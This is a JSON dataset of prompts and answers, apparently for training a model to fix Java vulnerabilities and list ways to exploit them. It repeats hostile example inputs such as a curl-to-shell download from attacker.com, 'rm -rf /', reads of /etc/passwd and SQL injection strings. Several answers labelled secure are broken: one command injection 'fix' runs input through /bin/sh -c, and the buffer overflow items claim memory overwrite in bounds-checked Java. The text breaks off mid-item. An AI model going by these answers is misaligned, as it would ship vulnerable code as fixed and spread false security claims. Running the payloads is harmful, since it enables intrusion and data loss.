    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: public class AuthChecker {\n    public boolean authenticate(String username, String password) {\n        if (username.equals(\"admin\") && password.equals(\"password123\")) {\n            return true;\n        }\n        return false;\n    }\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class AuthChecker {\\n    public boolean authenticate(String username, String password) {\\n        if (username.equals(\\\"admin\\\") && password.equals(\\\"password123\\\")) {\\n            return true;\\n        }\\n        return false;\\n    }\\n}",
      "vulnerability_type": "Broken Authentication",
      "cvss_score": 7.5,
      "fixed_code": "public class AuthChecker {\\n    private static final String ADMIN_USERNAME = \\\"admin\\\";\\n    private static final String ADMIN_PASSWORD_HASH = \\\"$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa\\\"; // Hash of 'password123'\\n    public boolean authenticate(String username, String password) {\\n        return ADMIN_USERNAME.equals(username) && BCrypt.checkpw(password, ADMIN_PASSWORD_HASH);\\n    }\\n}",
      "exploit_ways": [
        "An attacker can use the hardcoded credentials to log in as admin.",
        "If the application logs failed attempts, brute force attacks could be performed against the admin account.",
        "Hardcoded passwords are stored insecurely, making it easy for attackers to find them in the codebase."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Command Injection\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.InputStreamReader;\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.println(\"Enter command to execute:\");\n            String command = reader.readLine();\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = outputReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\npublic class VulnerableApp {\\n    public static void main(String[] args) {\\n        try {\\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n            System.out.println(\\\"Enter command to execute:\\\");\\n            String command = reader.readLine();\\n            Process process = Runtime.getRuntime().exec(command);\\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n            String line;\\n            while ((line = outputReader.readLine()) != null) {\\n                System.out.println(line);\\n            }\\n        } catch (Exception e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}",
      "vulnerability_type": "Command Injection",
      "cvss_score": 8.2,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\npublic class SecureApp {\\n    public static void main(String[] args) {\\n        try {\\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n            System.out.println(\\\"Enter command to execute:\\\");\\n            String command = reader.readLine();\\n            Process process = Runtime.getRuntime().exec(new String[]{\\\"/bin/sh\\\", \\\"-c\\\", command});\\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n            String line;\\n            while ((line = outputReader.readLine()) != null) {\\n                System.out.println(line);\\n            }\\n        } catch (Exception e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}",
      "exploit_ways": [
        "User could input 'rm -rf /' to delete system files.",
        "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
        "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\nimport java.util.Scanner;\n\npublic class VulnerableApp {\n    private Connection connect() {\n        String url = \"jdbc:mysql://localhost:3306/mydatabase\";\n        String user = \"user\";\n        String password = \"password\";\n        try {\n            return DriverManager.getConnection(url, user, password);\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n            return null;\n        }\n    }\n\n    public void queryDatabase(String userInput) {\n        String sql = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n        try (\n                Connection conn = connect();\n                java.sql.Statement stmt = conn.createStatement()) {\n            java.sql.ResultSet rs = stmt.executeQuery(sql);\n\n            while (rs.next()) {\n                System.out.println(rs.getString(\"username\") + \"\\t\" + rs.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) {\n        VulnerableApp app = new VulnerableApp();\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String userInput = scanner.nextLine();\n        app.queryDatabase(userInput);\n    }\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.sql.Connection;\\nimport java.sql.DriverManager;\\nimport java.sql.PreparedStatement;\\nimport java.sql.SQLException;\\nimport java.util.Scanner;\\n\\npublic class VulnerableApp {\\n    private Connection connect() {\\n        String url = \\\"jdbc:mysql://localhost:3306/mydatabase\\\";\\n        String user = \\\"user\\\";\\n        String password = \\\"password\\\";\\n        try {\\n            return DriverManager.getConnection(url, user, password);\\n        } catch (SQLException e) {\\n            System.out.println(e.getMessage());\\n            return null;\\n        }\\n    }\\n\\n    public void queryDatabase(String userInput) {\\n        String sql = \\\"SELECT * FROM users WHERE username = '\\\" + userInput + \\\"'\\\";\\n        try (\\n                Connection conn = connect();\\n                java.sql.Statement stmt = conn.createStatement()) {\\n            java.sql.ResultSet rs = stmt.executeQuery(sql);\\n\\n            while (rs.next()) {\\n                System.out.println(rs.getString(\\\"username\\\") + \\\"\\t\\\" + rs.getString(\\\"password\\\"));\\n            }\\n        } catch (SQLException e) {\\n            System.out.println(e.getMessage());\\n        }\\n    }\\n\\n    public static void main(String[] args) {\\n        VulnerableApp app = new VulnerableApp();\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.print(\\\"Enter username: \\\");\\n        String userInput = scanner.nextLine();\\n        app.queryDatabase(userInput);\\n    }\\n}",
      "vulnerability_type": "SQL Injection",
      "cvss_score": 7.5,
      "fixed_code": "import java.sql.Connection;\\nimport java.sql.DriverManager;\\nimport java.sql.PreparedStatement;\\nimport java.sql.ResultSet;\\nimport java.sql.SQLException;\\nimport java.util.Scanner;\\n\\npublic class SecureApp {\\n    private Connection connect() {\\n        String url = \\\"jdbc:mysql://localhost:3306/mydatabase\\\";\\n        String user = \\\"user\\\";\\n        String password = \\\"password\\\";\\n        try {\\n            return DriverManager.getConnection(url, user, password);\\n        } catch (SQLException e) {\\n            System.out.println(e.getMessage());\\n            return null;\\n        }\\n    }\\n\\n    public void queryDatabase(String userInput) {\\n        String sql = \\\"SELECT * FROM users WHERE username = ?\\\";\\n        try (\\n                Connection conn = connect();\\n                PreparedStatement pstmt = conn.prepareStatement(sql)) {\\n            pstmt.setString(1, userInput);\\n            ResultSet rs = pstmt.executeQuery();\\n\\n            while (rs.next()) {\\n                System.out.println(rs.getString(\\\"username\\\") + \\\"\\t\\\" + rs.getString(\\\"password\\\"));\\n            }\\n        } catch (SQLException e) {\\n            System.out.println(e.getMessage());\\n        }\\n    }\\n\\n    public static void main(String[] args) {\\n        SecureApp app = new SecureApp();\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.print(\\\"Enter username: \\\");\\n        String userInput = scanner.nextLine();\\n        app.queryDatabase(userInput);\\n    }\\n}",
      "exploit_ways": [
        "User could input \"admin' OR '1'='1\" to retrieve all users.",
        "Could use \"admin'; DROP TABLE users; --\" to delete the users table.",
        "Input like \"admin'; SELECT * FROM passwords; --\" can extract data from another table."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Command Injection\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass VulnerableApp {\n    public static void main(String[] args) {\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\n            System.out.println(\"Enter command: \");\n            String command = reader.readLine();\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = outputReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\nclass VulnerableApp {\\n    public static void main(String[] args) {\\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\\n            System.out.println(\\\"Enter command: \\\");\\n            String command = reader.readLine();\\n            Process process = Runtime.getRuntime().exec(command);\\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n            String line;\\n            while ((line = outputReader.readLine()) != null) {\\n                System.out.println(line);\\n            }\\n        } catch (Exception e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}",
      "vulnerability_type": "Command Injection",
      "cvss_score": 8.2,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\nclass SecureApp {\\n    public static void main(String[] args) {\\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\\n            System.out.println(\\\"Enter command: \\\");\\n            String[] allowedCommands = {\\\"ls\\\", \\\"whoami\\\"};\\n            String command = reader.readLine();\\n            for (String cmd : allowedCommands) {\\n                if (command.equals(cmd)) {\\n                    Process process = Runtime.getRuntime().exec(command);\\n                    BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n                    String line;\\n                    while ((line = outputReader.readLine()) != null) {\\n                        System.out.println(line);\\n                    }\\n                    break;\\n                }\\n            }\\n        } catch (Exception e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}",
      "exploit_ways": [
        "User could input 'rm -rf /' to delete system files.",
        "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
        "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Buffer Overflow\n- Vulnerable Code: public void vulnerableFunction(String input) {\n    byte[] buffer = new byte[10];\n    System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public void vulnerableFunction(String input) {\\n    byte[] buffer = new byte[10];\\n    System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\\n}",
      "vulnerability_type": "Buffer Overflow",
      "cvss_score": 7.5,
      "fixed_code": "public void safeFunction(String input) {\\n    byte[] buffer = new byte[10];\\n    byte[] inputData = input.getBytes();\\n    int lengthToCopy = Math.min(inputData.length, buffer.length);\\n    System.arraycopy(inputData, 0, buffer, 0, lengthToCopy);\\n}",
      "exploit_ways": [
        "An attacker can provide a string longer than 10 bytes to overwrite adjacent memory.",
        "This overflow could be used to manipulate program execution or corrupt data structures.",
        "In some environments, this vulnerability might allow an attacker to execute arbitrary code."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: public String getUserData(String userId) {\n    String query = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\n    return executeQuery(query);\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public String getUserData(String userId) {\\n    String query = \\\"SELECT * FROM users WHERE id = '\\\" + userId + \\\"'\\\";\\n    return executeQuery(query);\\n}",
      "vulnerability_type": "SQL Injection",
      "cvss_score": 8.2,
      "fixed_code": "public String getUserData(String userId) {\\n    String query = \\\"SELECT * FROM users WHERE id = ?\\\";\\n    try (PreparedStatement pstmt = connection.prepareStatement(query)) {\\n        pstmt.setString(1, userId);\\n        return executeQuery(pstmt);\\n    } catch (SQLException e) {\\n        e.printStackTrace();\\n    }\\n    return null;\\n}",
      "exploit_ways": [
        "An attacker could input ' OR '1'='1 to retrieve all user data.",
        "The attacker can inject a UNION SELECT statement to extract sensitive information from other tables.",
        "Using input like '; DROP TABLE users; --', an attacker can delete the users table, leading to data loss."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Remote Code Execution (RCE)\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command to execute:\");\n        String command = reader.readLine();\n        Runtime.getRuntime().exec(command);\n    }\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\n\\npublic class VulnerableApp {\\n    public static void main(String[] args) throws Exception {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        System.out.println(\\\"Enter command to execute:\\\");\\n        String command = reader.readLine();\\n        Runtime.getRuntime().exec(command);\\n    }\\n}",
      "vulnerability_type": "Remote Code Execution (RCE)",
      "cvss_score": 8.2,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\n\\npublic class SecureApp {\\n    public static void main(String[] args) throws Exception {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        System.out.println(\\\"Enter command to execute:\\\");\\n        String command = reader.readLine();\\n        if (command.equals(\\\"allowed_command\\\")) {\\n            Runtime.getRuntime().exec(command);\\n        } else {\\n            System.out.println(\\\"Command not allowed.\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "User could input 'rm -rf /' to delete system files.",
        "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
        "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Buffer Overflow\n- Vulnerable Code: import java.nio.ByteBuffer;\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        byte[] data = new byte[10];\n        ByteBuffer buffer = ByteBuffer.wrap(data);\n        for (int i = 0; i < 20; i++) {\n            buffer.put((byte) i);\n        }\n    }\n}\n- CVSS Score: 7.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.nio.ByteBuffer;\\npublic class VulnerableApp {\\n    public static void main(String[] args) {\\n        byte[] data = new byte[10];\\n        ByteBuffer buffer = ByteBuffer.wrap(data);\\n        for (int i = 0; i < 20; i++) {\\n            buffer.put((byte) i);\\n        }\\n    }\\n}",
      "vulnerability_type": "Buffer Overflow",
      "cvss_score": 7.8,
      "fixed_code": "import java.nio.ByteBuffer;\\npublic class SecureApp {\\n    public static void main(String[] args) {\\n        byte[] data = new byte[20];\\n        ByteBuffer buffer = ByteBuffer.wrap(data);\\n        for (int i = 0; i < 20; i++) {\\n            if (buffer.hasRemaining()) {\\n                buffer.put((byte) i);\\n            }\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker could inject data that overwrites adjacent memory, potentially altering the program's execution flow.",
        "The vulnerability might allow a crafted input to execute unintended code if the overflow can overwrite return addresses on the stack.",
        "Buffer overflow can lead to a Denial of Service (DoS) condition by causing the application to crash or behave unpredictably."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Buffer Overflow\n- Vulnerable Code: public class BufferOverflowExample {\n    public static void main(String[] args) {\n        byte[] buffer = new byte[10];\n        String input = \"A very long string that will cause an overflow when copied to the small buffer\";\n        System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\n    }\n}\n- CVSS Score: 7.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class BufferOverflowExample {\\n    public static void main(String[] args) {\\n        byte[] buffer = new byte[10];\\n        String input = \\\"A very long string that will cause an overflow when copied to the small buffer\\\";\\n        System.arraycopy(input.getBytes(), 0, buffer, 0, input.length());\\n    }\\n}",
      "vulnerability_type": "Buffer Overflow",
      "cvss_score": 7.8,
      "fixed_code": "public class BufferOverflowExample {\\n    public static void main(String[] args) {\\n        byte[] buffer = new byte[10];\\n        String input = \\\"A very long string that will cause an overflow when copied to the small buffer\\\";\\n        byte[] inputBytes = input.getBytes();\\n        System.arraycopy(inputBytes, 0, buffer, 0, Math.min(inputBytes.length, buffer.length));\\n    }\\n}",
      "exploit_ways": [
        "An attacker can craft an extremely long string to overwrite adjacent memory and potentially execute arbitrary code.",
        "The overflow could corrupt the stack, leading to program crashes or unpredictable behavior.",
        "By carefully crafting input, an attacker might be able to manipulate function pointers on the stack to redirect execution flow."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TransferServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String account = request.getParameter(\"account\");\n        String amount = request.getParameter(\"amount\");\n        \n        // Simulate a bank transfer operation\n        if (account != null && amount != null) {\n            // Transfer logic here...\n            response.getWriter().println(\"Transfer of \" + amount + \" to account \" + account + \" completed successfully.\");\n        }\n    }\n}\n- CVSS Score: 8.6\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    